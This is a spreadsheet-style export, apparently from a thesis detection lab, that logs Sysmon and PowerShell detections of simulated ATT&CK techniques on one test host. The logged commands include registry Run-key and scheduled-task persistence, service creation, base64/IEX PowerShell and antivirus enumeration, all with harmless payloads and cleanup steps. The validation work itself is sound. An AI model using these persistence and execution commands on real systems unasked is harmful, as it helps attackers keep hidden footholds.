Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:51:33.952Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.377Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.377Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P4	TEC-005	T1569.002	Windows service creation detected - basic profile v2	CU005_Source_TEC005_ServiceCreation_7045	LT29.ait.us.es	System	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	Windows System Event 7045	05_LOGS\Validas\Prueba_24_06_2026\CU005_Source_TEC005_ServiceCreation_7045-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.989Z	P2	TEC-001	T1059.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.900Z	P2	TEC-006	T1518.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:16.265Z	P2	TEC-006	T1518.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:37.594Z	P2	TEC-001	T1059.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	function Test-Tec009Evidence { param( [AllowEmptyString()][string]$Command = "", [AllowEmptyString()][string]$ScriptPath = "", [AllowEmptyString()][string]$ReceiverUrl = "", [AllowEmptyString()][string]$HttpStatus = "", [AllowEmptyString()][string]$UploadSucceeded = "", [AllowEmptyString()][string]$ZipFile = "", [AllowEmptyString()][string]$CopyFile = "", [AllowEmptyString()][string]$LocalSHA256 = "", [AllowEmptyString()][string]$SummaryFile = "", $SummaryObject = $null, $PowerShell4104 = $null ) $checks = @() $checks += New-EvidenceCheckRow -CheckName "powershell.exe -File invocation" -Status $(if ($Command -match '(?i)powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-File') { "OK" } else { "FAIL" }) -Expected "powershell.exe -NoProfile -ExecutionPolicy Bypass -File" -Found $Command -Evidence $Command -Comment "TEC-009 must run in an explicit PowerShell child process." $checks...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.715Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.715Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
